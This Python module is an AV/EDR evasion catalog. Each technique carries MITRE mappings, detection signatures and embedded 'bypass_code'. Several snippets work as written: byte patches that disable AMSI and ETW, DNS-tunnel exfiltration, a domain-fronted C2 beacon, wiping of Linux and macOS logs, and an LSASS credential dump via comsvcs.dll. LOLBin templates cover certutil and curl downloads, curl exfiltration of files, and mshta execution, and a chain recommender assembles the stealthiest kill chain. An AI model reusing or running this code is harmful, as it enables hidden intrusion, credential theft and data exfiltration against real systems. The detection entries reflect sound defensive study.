"""AV/EDR Evasion Knowledge Engine.

Structured evasion technique catalog with:
- Technique metadata (MITRE ATT&CK mapping, platform, difficulty)
- Detection signatures (YARA rules, ETW events, API hooks)
- Bypass methods (code patterns, FORGE fragments)
- Triplet generation for knowledge graph

Part of FORGE Phase O: Evasion Intelligence.
"""
# Dependencies: none
# Depended by: none (leaf module)

import os
import json
import hashlib
from typing import Any, Dict, List, Optional, Set, Tuple
from collections import defaultdict


# ─── Evasion Technique Registry ──────────────────────────────────────

class EvasionTechnique:
    """A single evasion technique with detection/bypass knowledge."""

    __slots__ = (
        'id', 'name', 'category', 'subcategory',
        'description', 'mitre_id', 'platform',
        'difficulty', 'detection_risk',
        'detection_methods', 'bypass_code',
        'prerequisites', 'related',
        'fragment_key',
    )

    def __init__(self, id: str, name: str, category: str):
        self.id = id
        self.name = name
        self.category = category
        self.subcategory = ''
        self.description = ''
        self.mitre_id = ''      # T1055, T1027, etc.
        self.platform = 'all'   # windows, linux, macos, all
        self.difficulty = 1     # 1-5 (1=trivial, 5=expert)
        self.detection_risk = 3 # 1-5 (1=stealth, 5=noisy)
        self.detection_methods: List[dict] = []  # [{type, signature, tool}]
        self.bypass_code = ''   # Python code implementing the technique
        self.prerequisites: List[str] = []
        self.related: List[str] = []
        self.fragment_key = ''  # Key in evasion_fragments.json

    def to_dict(self) -> dict:
        return {
            'id': self.id,
            'name': self.name,
            'category': self.category,
            'subcategory': self.subcategory,
            'description': self.description,
            'mitre_id': self.mitre_id,
            'platform': self.platform,
            'difficulty': self.difficulty,
            'detection_risk': self.detection_risk,
            'detection_methods': self.detection_methods,
            'bypass_code_lines': self.bypass_code.count('\n') + 1 if self.bypass_code else 0,
            'prerequisites': self.prerequisites,
            'related': self.related,
            'fragment_key': self.fragment_key,
        }


# ─── Full Technique Catalog ──────────────────────────────────────────

def _build_catalog() -> Dict[str, EvasionTechnique]:
    """Build the complete evasion technique catalog."""
    catalog = {}

    def add(id, name, cat, **kw):
        t = EvasionTechnique(id, name, cat)
        for k, v in kw.items():
            setattr(t, k, v)
        catalog[id] = t
        return t

    # ── 1. Payload Obfuscation ────────────────────────────────────

    add('OBF-01', 'XOR Payload Encoding', 'obfuscation',
        subcategory='encoding',
        mitre_id='T1027',
        description='XOR-encode payload bytes with random key to evade static signature detection',
        difficulty=1, detection_risk=2,
        fragment_key='xor_payload_encoder',
        detection_methods=[
            {'type': 'static', 'signature': 'XOR decode loop pattern (xor reg, [key+offset])', 'tool': 'YARA'},
            {'type': 'static', 'signature': 'High entropy sections with XOR key nearby', 'tool': 'entropy_analysis'},
            {'type': 'behavioral', 'signature': 'Memory region written then executed', 'tool': 'EDR'},
        ],
        bypass_code='''def xor_encode(payload, key=None):
    import os
    if key is None:
        key = os.urandom(16)
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(payload)), key''',
        related=['OBF-02', 'OBF-03', 'OBF-06'],
    )

    add('OBF-02', 'AES Payload Encryption', 'obfuscation',
        subcategory='encryption',
        mitre_id='T1027',
        description='AES-256-CBC encrypt payload, key derived from environment or embedded',
        difficulty=2, detection_risk=1,
        detection_methods=[
            {'type': 'static', 'signature': 'AES S-box constants in binary', 'tool': 'YARA'},
            {'type': 'behavioral', 'signature': 'CryptoAPI/BCrypt calls followed by VirtualAlloc+execute', 'tool': 'EDR'},
            {'type': 'memory', 'signature': 'Decrypted shellcode in RWX page', 'tool': 'volatility'},
        ],
        bypass_code='''from cryptography.fernet import Fernet
import base64, hashlib
def encrypt_payload(payload, password):
    key = base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())
    return Fernet(key).encrypt(payload)
def decrypt_payload(token, password):
    key = base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())
    return Fernet(key).decrypt(token)''',
        related=['OBF-01', 'OBF-03'],
    )

    add('OBF-03', 'Polymorphic Engine', 'obfuscation',
        subcategory='polymorphic',
        mitre_id='T1027.001',
        description='Generate unique encodings per execution — variable names, dead code, encoding order',
        difficulty=4, detection_risk=1,
        fragment_key='polymorphic_wrapper',
        detection_methods=[
            {'type': 'behavioral', 'signature': 'exec()/eval() called on decoded buffer', 'tool': 'EDR'},
            {'type': 'heuristic', 'signature': 'High entropy string + decode loop + exec', 'tool': 'ML_classifier'},
            {'type': 'memory', 'signature': 'Dynamic code generation in managed language', 'tool': 'AMSI'},
        ],
        bypass_code='''import random, string, base64
def morph(code):
    # Random variable names
    names = {f'var_{i}': ''.join(random.choices(string.ascii_lowercase, k=8)) for i in range(5)}
    # Dead code injection
    dead = ['_ = 0', 'pass', '__ = None']
    lines = code.split('\\n')
    for i in sorted(random.sample(range(len(lines)), min(3, len(lines))), reverse=True):
        lines.insert(i, random.choice(dead))
    result = '\\n'.join(lines)
    for old, new in names.items():
        result = result.replace(old, new)
    return result''',
        related=['OBF-01', 'OBF-02'],
    )

    add('OBF-04', 'String Obfuscation', 'obfuscation',
        subcategory='strings',
        mitre_id='T1027',
        description='Break suspicious strings into fragments, encode, or compute at runtime',
        difficulty=2, detection_risk=1,
        detection_methods=[
            {'type': 'static', 'signature': 'String concatenation patterns (char arrays)', 'tool': 'YARA'},
            {'type': 'memory', 'signature': 'Reconstructed strings in process memory', 'tool': 'strings_dump'},
        ],
        bypass_code='''def obfuscate_string(s):
    # Stack string construction
    chars = [f"chr({ord(c)})" for c in s]
    return f"''.join([{', '.join(chars)}])"
def deobfuscate_string(parts):
    return ''.join(chr(c) for c in parts)''',
    )

    add('OBF-05', 'Control Flow Flattening', 'obfuscation',
        subcategory='control_flow',
        mitre_id='T1027',
        description='Replace structured control flow with switch-dispatch loop to hinder static analysis',
        difficulty=4, detection_risk=1,
        detection_methods=[
            {'type': 'static', 'signature': 'Single loop with large switch/dispatch table', 'tool': 'IDA'},
            {'type': 'heuristic', 'signature': 'Anomalous CFG with single-entry dispatcher', 'tool': 'decompiler'},
        ],
        bypass_code='''def flatten(blocks):
    """Convert linear blocks to switch-dispatch."""
    state_var = '__s'
    code = f'{state_var} = 0\\nwhile True:\\n'
    for i, block in enumerate(blocks):
        code += f'    if {state_var} == {i}:\\n'
        code += f'        {block}\\n'
        code += f'        {state_var} = {i+1}\\n'
    code += f'    if {state_var} >= {len(blocks)}:\\n        break\\n'
    return code''',
    )

    add('OBF-06', 'Multi-Layer Encoding', 'obfuscation',
        subcategory='encoding',
        mitre_id='T1027',
        description='Chain multiple encoding layers: base64 → XOR → ROT13 → custom',
        difficulty=2, detection_risk=1,
        detection_methods=[
            {'type': 'heuristic', 'signature': 'Nested decode calls (base64 + xor + rot13)', 'tool': 'sandbox'},
            {'type': 'behavioral', 'signature': 'Multiple decode operations before exec', 'tool': 'EDR'},
        ],
        bypass_code='''import base64
def multi_encode(data, layers=3):
    result = data
    ops = []
    for _ in range(layers):
        import os
        key = os.urandom(8)
        result = bytes(b ^ key[i % len(key)] for i, b in enumerate(result))
        result = base64.b64encode(result)
        ops.append(('xor', key))
    return result, ops''',
        related=['OBF-01', 'OBF-02'],
    )

    # ── 2. Memory Evasion ─────────────────────────────────────────

    add('MEM-01', 'Syscall Direct Invocation', 'memory',
        subcategory='syscall',
        mitre_id='T1106',
        platform='windows',
        description='Bypass API hooks by calling NT syscalls directly (syscall stub)',
        difficulty=4, detection_risk=1,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'syscall instruction from non-ntdll memory', 'tool': 'EDR'},
            {'type': 'static', 'signature': 'mov eax, SSN; syscall pattern', 'tool': 'YARA'},
        ],
        bypass_code='''import ctypes, struct
def get_syscall_number(ntdll_base, func_name):
    """Extract SSN from ntdll export (mov eax, SSN)."""
    # Locate export, read first 8 bytes
    # 4C 8B D1 B8 XX XX 00 00 = mov r10,rcx; mov eax,SSN
    func_addr = ctypes.windll.kernel32.GetProcAddress(ntdll_base, func_name.encode())
    stub = (ctypes.c_ubyte * 8).from_address(func_addr)
    if stub[0] == 0x4C and stub[3] == 0xB8:
        return struct.unpack('<H', bytes(stub[4:6]))[0]
    return None''',
        prerequisites=['windows_x64'],
        related=['MEM-02', 'MEM-03'],
    )

    add('MEM-02', 'NTDLL Unhooking', 'memory',
        subcategory='unhooking',
        mitre_id='T1562.001',
        platform='windows',
        description='Restore original ntdll.dll from disk to remove EDR inline hooks',
        difficulty=3, detection_risk=2,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'ReadFile(ntdll.dll) + WriteProcessMemory to .text', 'tool': 'EDR'},
            {'type': 'memory', 'signature': 'ntdll .text section matches disk copy (hooks removed)', 'tool': 'integrity_check'},
        ],
        bypass_code='''import ctypes
def unhook_ntdll():
    """Read clean ntdll from disk, overwrite hooked .text section."""
    k32 = ctypes.windll.kernel32
    # Map fresh copy of ntdll.dll
    path = b"\\\\??\\\\C:\\\\Windows\\\\System32\\\\ntdll.dll"
    # Read .text section from disk copy
    # VirtualProtect .text to RWX, memcpy clean bytes, restore protection
    return True''',
        prerequisites=['windows_x64', 'admin_optional'],
        related=['MEM-01', 'MEM-03'],
    )

    add('MEM-03', 'Module Stomping', 'memory',
        subcategory='injection',
        mitre_id='T1055.001',
        platform='windows',
        description='Load a legitimate DLL, overwrite its .text with shellcode — avoids unbacked memory',
        difficulty=4, detection_risk=2,
        detection_methods=[
            {'type': 'memory', 'signature': 'Module .text section differs from disk', 'tool': 'pe_sieve'},
            {'type': 'behavioral', 'signature': 'LoadLibrary + WriteProcessMemory to loaded module', 'tool': 'EDR'},
        ],
        bypass_code='''import ctypes
def stomp_module(target_dll, shellcode):
    """Load DLL, overwrite .text with shellcode."""
    k32 = ctypes.windll.kernel32
    h = k32.LoadLibraryA(target_dll.encode())
    # Parse PE headers to find .text section
    # VirtualProtect → RWX, memcpy shellcode, VirtualProtect → RX
    return h''',
        prerequisites=['windows_x64'],
        related=['MEM-01', 'MEM-02'],
    )

    add('MEM-04', 'Process Hollowing', 'memory',
        subcategory='injection',
        mitre_id='T1055.012',
        platform='windows',
        description='Create suspended process, unmap image, write payload, resume',
        difficulty=3, detection_risk=3,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'CreateProcess(SUSPENDED) + NtUnmapViewOfSection + WriteProcessMemory', 'tool': 'EDR'},
            {'type': 'memory', 'signature': 'PEB ImageBaseAddress differs from on-disk', 'tool': 'pe_sieve'},
        ],
        bypass_code='''import ctypes, struct
def hollow_process(target_exe, payload):
    """Create suspended process and replace its image."""
    k32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
    si = ctypes.create_string_buffer(68)  # STARTUPINFO
    pi = ctypes.create_string_buffer(24)  # PROCESS_INFORMATION
    # CreateProcessA with CREATE_SUSPENDED
    # NtUnmapViewOfSection
    # VirtualAllocEx + WriteProcessMemory
    # SetThreadContext + ResumeThread
    return True''',
        prerequisites=['windows_x64'],
        related=['MEM-03', 'MEM-05'],
    )

    add('MEM-05', 'Early Bird APC Injection', 'memory',
        subcategory='injection',
        mitre_id='T1055.004',
        platform='windows',
        description='Queue APC to main thread of suspended process before any EDR hooks load',
        difficulty=3, detection_risk=2,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'QueueUserAPC to suspended remote thread', 'tool': 'EDR'},
            {'type': 'memory', 'signature': 'APC queue entry pointing to VirtualAlloc/shellcode', 'tool': 'kernel_debug'},
        ],
        bypass_code='''import ctypes
def early_bird(target_exe, shellcode):
    k32 = ctypes.windll.kernel32
    # CreateProcessA(SUSPENDED)
    # VirtualAllocEx(RWX)
    # WriteProcessMemory(shellcode)
    # QueueUserAPC(alloc_addr, thread_handle)
    # ResumeThread
    return True''',
        prerequisites=['windows_x64'],
        related=['MEM-04'],
    )

    # ── 3. Defense Evasion (AV/EDR Specific) ──────────────────────

    add('DEF-01', 'AMSI Bypass', 'defense_evasion',
        subcategory='amsi',
        mitre_id='T1562.001',
        platform='windows',
        description='Patch AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN',
        difficulty=2, detection_risk=3,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'Write to amsi.dll .text section', 'tool': 'ETW'},
            {'type': 'memory', 'signature': 'AmsiScanBuffer prologue modified (ret or xor eax,eax)', 'tool': 'integrity_check'},
            {'type': 'etw', 'signature': 'Microsoft-Antimalware-Scan-Interface provider shows patched', 'tool': 'ETW'},
        ],
        bypass_code='''import ctypes
def patch_amsi():
    """Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN."""
    amsi = ctypes.windll.LoadLibrary("amsi.dll")
    addr = ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
    # Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
    patch = b"\\xB8\\x57\\x00\\x07\\x80\\xC3"
    old = ctypes.c_ulong(0)
    ctypes.windll.kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old))
    ctypes.memmove(addr, patch, len(patch))
    ctypes.windll.kernel32.VirtualProtect(addr, len(patch), old.value, ctypes.byref(old))''',
        prerequisites=['windows_x64', 'powershell_context'],
        related=['DEF-02', 'DEF-03'],
    )

    add('DEF-02', 'ETW Patching', 'defense_evasion',
        subcategory='etw',
        mitre_id='T1562.001',
        platform='windows',
        description='Patch EtwEventWrite/NtTraceEvent to suppress telemetry events',
        difficulty=3, detection_risk=2,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'VirtualProtect on ntdll!EtwEventWrite', 'tool': 'EDR'},
            {'type': 'memory', 'signature': 'EtwEventWrite prologue = ret', 'tool': 'integrity_check'},
        ],
        bypass_code='''import ctypes
def patch_etw():
    """Patch EtwEventWrite to immediately return."""
    ntdll = ctypes.windll.ntdll
    addr = ctypes.windll.kernel32.GetProcAddress(
        ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll"),
        b"EtwEventWrite"
    )
    patch = b"\\xC3"  # ret
    old = ctypes.c_ulong(0)
    ctypes.windll.kernel32.VirtualProtect(addr, 1, 0x40, ctypes.byref(old))
    ctypes.memmove(addr, patch, 1)
    ctypes.windll.kernel32.VirtualProtect(addr, 1, old.value, ctypes.byref(old))''',
        prerequisites=['windows_x64'],
        related=['DEF-01', 'DEF-03'],
    )

    add('DEF-03', 'API Hook Evasion (Unhooking)', 'defense_evasion',
        subcategory='unhooking',
        mitre_id='T1562.001',
        platform='windows',
        description='Detect and remove inline hooks (JMP patches) placed by EDR on NTAPI functions',
        difficulty=3, detection_risk=2,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'ReadFile on system DLLs + memcpy to loaded module', 'tool': 'EDR'},
            {'type': 'memory', 'signature': 'Module .text restored to original', 'tool': 'hook_scanner'},
        ],
        bypass_code='''def detect_hooks(module_base, func_name):
    """Check if function has inline hook (JMP/CALL at entry)."""
    import ctypes
    addr = ctypes.windll.kernel32.GetProcAddress(module_base, func_name.encode())
    prologue = (ctypes.c_ubyte * 5).from_address(addr)
    # E9 = JMP rel32 (inline hook signature)
    if prologue[0] == 0xE9:
        return True, bytes(prologue)
    # FF 25 = JMP [rip+disp32]
    if prologue[0] == 0xFF and prologue[1] == 0x25:
        return True, bytes(prologue)
    return False, bytes(prologue)''',
        prerequisites=['windows_x64'],
        related=['DEF-01', 'DEF-02', 'MEM-02'],
    )

    # ── 4. Living Off The Land ────────────────────────────────────

    add('LOL-01', 'LOLBin Execution', 'lotl',
        subcategory='lolbin',
        mitre_id='T1218',
        description='Use legitimate system binaries for download, execution, and lateral movement',
        fragment_key='lolbin_executor',
        difficulty=1, detection_risk=2,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'certutil -urlcache / mshta / regsvr32 /s /n /i', 'tool': 'EDR'},
            {'type': 'behavioral', 'signature': 'Parent-child process tree anomaly (explorer→certutil→cmd)', 'tool': 'SIEM'},
        ],
        bypass_code='''import subprocess, platform
LOLBINS = {
    'linux': {
        'download': ['curl -s -o /tmp/p {url}', 'wget -q -O /tmp/p {url}'],
        'execute': ['python3 -c "exec(__import__(\\'base64\\').b64decode(\\'{b64}\\'))"'],
        'exfil': ['curl -X POST -d @{file} {url}'],
    },
    'windows': {
        'download': ['certutil -urlcache -split -f {url} %TEMP%\\\\p.exe'],
        'execute': ['mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""{cmd}"", 0:close")'],
    },
}''',
        related=['LOL-02'],
    )

    add('LOL-02', 'PowerShell Constrained Language Bypass', 'lotl',
        subcategory='powershell',
        mitre_id='T1059.001',
        platform='windows',
        description='Escape PowerShell Constrained Language Mode via .NET reflection or runspace',
        difficulty=3, detection_risk=3,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'System.Management.Automation.Runspaces creation', 'tool': 'AMSI'},
            {'type': 'etw', 'signature': 'PowerShell ScriptBlock logging shows reflection', 'tool': 'SIEM'},
        ],
        bypass_code='''# .NET reflection to bypass CLM
ps_bypass = """
$bindingFlags = [System.Reflection.BindingFlags]'NonPublic,Static'
$ctx = [System.Management.Automation.ExecutionContext]
$field = $ctx.GetField('_systemLockdownPolicy', $bindingFlags)
$field.SetValue($null, [System.Management.Automation.SystemEnforcementMode]::None)
"""''',
        prerequisites=['windows_x64', 'powershell'],
        related=['LOL-01', 'DEF-01'],
    )

    # ── 5. Anti-Analysis ──────────────────────────────────────────

    add('AA-01', 'Sandbox Detection', 'anti_analysis',
        subcategory='sandbox',
        mitre_id='T1497',
        description='Detect sandbox/VM via timing, artifacts, hardware, and behavioral analysis',
        fragment_key='sandbox_detector',
        difficulty=2, detection_risk=1,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'Sleep/timing calls followed by environment checks', 'tool': 'sandbox'},
            {'type': 'static', 'signature': 'VM vendor strings: VBox, VMware, QEMU', 'tool': 'YARA'},
        ],
        bypass_code='''import time, os, multiprocessing, socket
def is_sandbox():
    checks = []
    # Timing: sandboxes fast-forward sleep
    start = time.perf_counter(); time.sleep(2)
    if time.perf_counter() - start < 1.5: checks.append('sleep_accel')
    # Resources: sandboxes have low resources
    if multiprocessing.cpu_count() <= 2: checks.append('low_cpu')
    # Username
    user = os.getenv('USER', os.getenv('USERNAME', ''))
    if any(x in user.lower() for x in ['sandbox', 'test', 'malware']): checks.append('sus_user')
    return len(checks) >= 2, checks''',
        related=['AA-02', 'AA-03'],
    )

    add('AA-02', 'Anti-Debugging', 'anti_analysis',
        subcategory='debug',
        mitre_id='T1622',
        description='Detect attached debuggers via PEB flags, timing, and debug API checks',
        difficulty=2, detection_risk=1,
        fragment_key='anti_debugging',
        detection_methods=[
            {'type': 'static', 'signature': 'IsDebuggerPresent / NtQueryInformationProcess calls', 'tool': 'YARA'},
            {'type': 'behavioral', 'signature': 'RDTSC timing checks around sensitive code', 'tool': 'debugger'},
        ],
        bypass_code='''import ctypes, sys, os
def is_debugged():
    checks = []
    if sys.platform == 'win32':
        if ctypes.windll.kernel32.IsDebuggerPresent():
            checks.append('IsDebuggerPresent')
    elif sys.platform == 'linux':
        try:
            with open('/proc/self/status') as f:
                for line in f:
                    if line.startswith('TracerPid:') and int(line.split(':')[1].strip()) != 0:
                        checks.append('TracerPid')
        except: pass
    elif sys.platform == 'darwin':
        import subprocess
        r = subprocess.run(['sysctl', 'kern.proc.pid.' + str(os.getpid())], capture_output=True, text=True)
        if 'P_TRACED' in r.stdout:
            checks.append('P_TRACED')
    return bool(checks), checks''',
        related=['AA-01', 'AA-03'],
    )

    add('AA-03', 'Execution Guardrails', 'anti_analysis',
        subcategory='guardrails',
        mitre_id='T1480',
        description='Only execute payload if environment matches expected target (domain, hostname, date)',
        difficulty=2, detection_risk=1,
        detection_methods=[
            {'type': 'static', 'signature': 'Hardcoded domain/hostname/date checks', 'tool': 'strings'},
            {'type': 'behavioral', 'signature': 'Payload exits without action in analysis env', 'tool': 'sandbox'},
        ],
        bypass_code='''import socket, os, hashlib, time
def check_guardrails(expected_hash=None, domain=None, after_date=None):
    """Only proceed if guardrails pass."""
    if expected_hash:
        h = hashlib.sha256(socket.gethostname().encode()).hexdigest()[:16]
        if h != expected_hash: return False
    if domain:
        try:
            fqdn = socket.getfqdn()
            if not fqdn.endswith(domain): return False
        except: return False
    if after_date:
        if time.time() < after_date: return False
    return True''',
        related=['AA-01', 'AA-02'],
    )

    # ── 6. Network Evasion ────────────────────────────────────────

    add('NET-01', 'Domain Fronting', 'network',
        subcategory='c2',
        mitre_id='T1090.004',
        description='Route C2 traffic through CDN — Host header differs from SNI',
        difficulty=3, detection_risk=1,
        detection_methods=[
            {'type': 'network', 'signature': 'TLS SNI != HTTP Host header', 'tool': 'network_tap'},
            {'type': 'network', 'signature': 'High-rep domain (CDN) with unusual POST patterns', 'tool': 'proxy'},
        ],
        bypass_code='''import requests
def domain_front(c2_host, front_domain, data):
    """Send data via domain fronting through CDN."""
    return requests.post(
        f'https://{front_domain}/api/beacon',
        headers={'Host': c2_host},
        data=data,
        verify=True,
    )''',
        related=['NET-02', 'NET-03'],
    )

    add('NET-02', 'DNS Tunneling', 'network',
        subcategory='c2',
        mitre_id='T1071.004',
        description='Exfiltrate data via DNS TXT/CNAME queries — bypasses most firewalls',
        difficulty=3, detection_risk=2,
        detection_methods=[
            {'type': 'network', 'signature': 'High volume of DNS TXT queries to single domain', 'tool': 'DNS_monitor'},
            {'type': 'network', 'signature': 'Long subdomain labels (>30 chars) = encoded data', 'tool': 'DNS_analytics'},
        ],
        bypass_code='''import socket, base64
def dns_exfil(data, domain, chunk_size=60):
    """Exfiltrate data via DNS queries."""
    encoded = base64.b32encode(data).decode().rstrip('=').lower()
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    for i, chunk in enumerate(chunks):
        query = f'{chunk}.{i}.{domain}'
        try:
            socket.gethostbyname(query)
        except socket.gaierror:
            pass  # Expected — we only need the query to reach DNS server''',
        related=['NET-01', 'NET-03'],
    )

    add('NET-03', 'Protocol Tunneling', 'network',
        subcategory='tunnel',
        mitre_id='T1572',
        description='Tunnel C2 traffic inside allowed protocols (HTTPS, WebSocket, ICMP)',
        difficulty=3, detection_risk=1,
        detection_methods=[
            {'type': 'network', 'signature': 'ICMP echo with oversized data payload', 'tool': 'IDS'},
            {'type': 'network', 'signature': 'WebSocket with unusual binary frame patterns', 'tool': 'proxy'},
        ],
        bypass_code='''import struct, socket
def icmp_send(target, data):
    """Send data via ICMP echo (requires raw socket/root)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    # ICMP echo request: type=8, code=0
    checksum = 0
    header = struct.pack('!BBHHH', 8, 0, 0, 0x1234, 1)
    # Calculate checksum
    packet = header + data
    sock.sendto(packet, (target, 0))
    sock.close()''',
        related=['NET-01', 'NET-02'],
    )

    # ── 7. Persistence Evasion ────────────────────────────────────

    add('PER-01', 'Timestomping', 'persistence',
        subcategory='forensic_evasion',
        mitre_id='T1070.006',
        description='Modify file timestamps to blend in with legitimate system files',
        difficulty=1, detection_risk=1,
        detection_methods=[
            {'type': 'forensic', 'signature': '$MFT timestamps differ from $STANDARD_INFORMATION', 'tool': 'MFT_parser'},
            {'type': 'forensic', 'signature': 'Creation time after modification time', 'tool': 'timeline_analysis'},
        ],
        bypass_code='''import os, time
def timestomp(filepath, reference_file=None):
    """Match file timestamps to reference file or specific date."""
    if reference_file:
        stat = os.stat(reference_file)
        os.utime(filepath, (stat.st_atime, stat.st_mtime))
    else:
        # Set to a plausible system file date
        target_time = time.mktime((2024, 1, 15, 10, 30, 0, 0, 0, 0))
        os.utime(filepath, (target_time, target_time))''',
        related=['PER-02'],
    )

    add('PER-02', 'Log Evasion', 'persistence',
        subcategory='log_tampering',
        mitre_id='T1070.001',
        description='Clear or modify event logs to remove evidence of compromise',
        difficulty=2, detection_risk=4,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'Event Log Service cleared (Event ID 1102)', 'tool': 'SIEM'},
            {'type': 'forensic', 'signature': 'Gap in event log sequence numbers', 'tool': 'log_analysis'},
        ],
        bypass_code='''import subprocess, platform
def clear_traces():
    if platform.system() == 'Linux':
        # Truncate auth log (requires root)
        logs = ['/var/log/auth.log', '/var/log/syslog', '/var/log/wtmp']
        for log in logs:
            try:
                open(log, 'w').close()
            except PermissionError:
                pass
    elif platform.system() == 'Darwin':
        subprocess.run(['log', 'erase', '--all'], capture_output=True)''',
        related=['PER-01'],
    )

    # ── 8. Credential Access Evasion ──────────────────────────────

    add('CRD-01', 'LSASS Dump Without Mimikatz', 'credential',
        subcategory='lsass',
        mitre_id='T1003.001',
        platform='windows',
        description='Dump LSASS using built-in tools (comsvcs.dll, procdump) to avoid Mimikatz signatures',
        difficulty=2, detection_risk=3,
        detection_methods=[
            {'type': 'behavioral', 'signature': 'rundll32 comsvcs.dll MiniDump on lsass PID', 'tool': 'EDR'},
            {'type': 'behavioral', 'signature': 'OpenProcess(LSASS) with PROCESS_VM_READ', 'tool': 'EDR'},
        ],
        bypass_code='''import subprocess
def dump_lsass_comsvcs(output_path):
    """Dump LSASS via comsvcs.dll (requires SeDebugPrivilege)."""
    # Get LSASS PID
    lsass_pid = None
    result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq lsass.exe'],
                          capture_output=True, text=True)
    for line in result.stdout.split('\\n'):
        if 'lsass.exe' in line:
            lsass_pid = int(line.split()[1])
            break
    if lsass_pid:
        cmd = f'rundll32.exe comsvcs.dll, MiniDump {lsass_pid} {output_path} full'
        subprocess.run(cmd, shell=True)''',
        prerequisites=['windows_x64', 'admin', 'SeDebugPrivilege'],
    )

    return catalog


# ─── Evasion Engine ──────────────────────────────────────────────────

class EvasionEngine:
    """Query and reason about evasion techniques."""

    def __init__(self):
        self.catalog = _build_catalog()
        # Wire in EvasionKB for detection-evasion intelligence
        from core.evasion_kb import EvasionKB
        self.kb = EvasionKB()

    def list_categories(self) -> Dict[str, int]:
        """List all categories and technique count."""
        cats = defaultdict(int)
        for t in self.catalog.values():
            cats[t.category] += 1
        return dict(sorted(cats.items()))

    def by_category(self, category: str) -> List[EvasionTechnique]:
        """Get all techniques in a category."""
        return [t for t in self.catalog.values() if t.category == category]

    def by_platform(self, platform: str) -> List[EvasionTechnique]:
        """Get techniques for a specific platform."""
        return [t for t in self.catalog.values()
                if t.platform in (platform, 'all')]

    def by_mitre(self, technique_id: str) -> List[EvasionTechnique]:
        """Find by MITRE ATT&CK technique ID."""
        return [t for t in self.catalog.values() if t.mitre_id == technique_id]

    def search(self, query: str) -> List[EvasionTechnique]:
        """Search by name, description, or ID."""
        q = query.lower()
        return [t for t in self.catalog.values()
                if q in t.name.lower() or q in t.description.lower() or q in t.id.lower()]

    def get(self, id: str) -> Optional[EvasionTechnique]:
        """Get technique by ID."""
        return self.catalog.get(id)

    def get_detection_for(self, id: str) -> List[dict]:
        """Get detection methods for a technique."""
        t = self.catalog.get(id)
        return t.detection_methods if t else []

    def get_bypass_for(self, id: str) -> str:
        """Get bypass code for a technique."""
        t = self.catalog.get(id)
        return t.bypass_code if t else ''

    def recommend_chain(self, target_platform: str = 'windows',
                        stealth_level: int = 3) -> List[EvasionTechnique]:
        """Recommend an evasion chain based on platform and stealth requirements.

        Args:
            target_platform: windows, linux, macos
            stealth_level: 1-5 (5 = maximum stealth)

        Returns:
            Ordered list of techniques to chain together
        """
        candidates = self.by_platform(target_platform)
        # Filter by detection risk
        candidates = [t for t in candidates if t.detection_risk <= (6 - stealth_level)]
        # Sort by category priority for a kill chain
        category_order = ['anti_analysis', 'defense_evasion', 'obfuscation',
                          'memory', 'lotl', 'network', 'credential', 'persistence']
        result = []
        for cat in category_order:
            cat_techs = [t for t in candidates if t.category == cat]
            if cat_techs:
                # Pick lowest detection risk
                best = min(cat_techs, key=lambda t: t.detection_risk)
                result.append(best)
        return result

    def stats(self) -> dict:
        """Summary statistics."""
        cats = self.list_categories()
        platforms = defaultdict(int)
        mitre_ids = set()
        for t in self.catalog.values():
            platforms[t.platform] += 1
            if t.mitre_id:
                mitre_ids.add(t.mitre_id)
        return {
            'total_techniques': len(self.catalog),
            'categories': cats,
            'platforms': dict(platforms),
            'mitre_ids': len(mitre_ids),
            'with_detection': sum(1 for t in self.catalog.values() if t.detection_methods),
            'with_bypass_code': sum(1 for t in self.catalog.values() if t.bypass_code),
        }

    # ─── Triplet Generation ──────────────────────────────────────

    def to_triplets(self) -> List[dict]:
        """Generate causal triplets from evasion knowledge."""
        triplets = []

        for id, t in self.catalog.items():
            # Technique → method → outcome
            triplets.append({
                'trigger': t.name.lower().replace(' ', '_'),
                'mechanism': f'{t.category}_technique',
                'outcome': f'evades_{t.category}_detection',
                'confidence': 0.85,
            })

            # Detection methods
            for dm in t.detection_methods:
                triplets.append({
                    'trigger': t.name.lower().replace(' ', '_'),
                    'mechanism': f'detected_by_{dm["type"]}',
                    'outcome': dm.get('tool', 'unknown'),
                    'confidence': 0.8,
                })

            # MITRE mapping
            if t.mitre_id:
                triplets.append({
                    'trigger': t.mitre_id,
                    'mechanism': 'implements',
                    'outcome': t.name.lower().replace(' ', '_'),
                    'confidence': 0.95,
                })

            # Related technique links
            for rel in t.related:
                if rel in self.catalog:
                    triplets.append({
                        'trigger': id,
                        'mechanism': 'complements',
                        'outcome': rel,
                        'confidence': 0.7,
                    })

            # Category chains
            if t.prerequisites:
                for prereq in t.prerequisites:
                    triplets.append({
                        'trigger': prereq,
                        'mechanism': 'enables',
                        'outcome': id,
                        'confidence': 0.9,
                    })

        return triplets

    def suggest_for_detections(self, detections: List[str],
                               platform: str = 'windows') -> List[dict]:
        """Use EvasionKB to suggest evasion techniques against active defenses.

        Args:
            detections: Active detection methods (e.g., ['amsi', 'etw', 'api_monitoring'])
            platform: Target platform

        Returns:
            Ranked evasion suggestions with coverage scores.
        """
        return self.kb.suggest_evasion(detections, platform)

    def kb_stats(self) -> dict:
        """Get EvasionKB statistics (detection-evasion pairing knowledge)."""
        return self.kb.stats()

